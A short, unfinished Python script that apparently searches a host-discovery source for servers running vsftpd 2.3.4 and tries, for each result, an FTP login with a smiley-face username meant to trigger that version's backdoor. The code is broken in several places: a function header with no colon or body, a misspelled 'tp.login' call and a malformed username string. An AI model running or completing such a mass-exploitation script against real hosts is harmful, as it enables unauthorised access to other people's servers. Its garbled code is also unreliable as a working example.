#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2019-04-03 23:49:05
# @Author  : owefsad (1528360120@qq.com)
# @Link    : http://blog.51cto.com/executer
# @Version : $Id$

from spider import get_sd
from ftplib import FTP
import threading

def connect_backdoor()

def load_backdoor(ip, port):
	try:
		ftp = FTP(ip)
		ftp.port = port
		tp.login(user=k"ftp:)", passwd="pass")
	except Exception as e:
		raise
	else:
		pass
	finally:
		pass


def main():
	ress=get_sd("vsftpd 2.3.4")
	for res in ress:
		load_backdoor(ip=res[0], port=res[1])

if __name__ == '__main__':
	main()
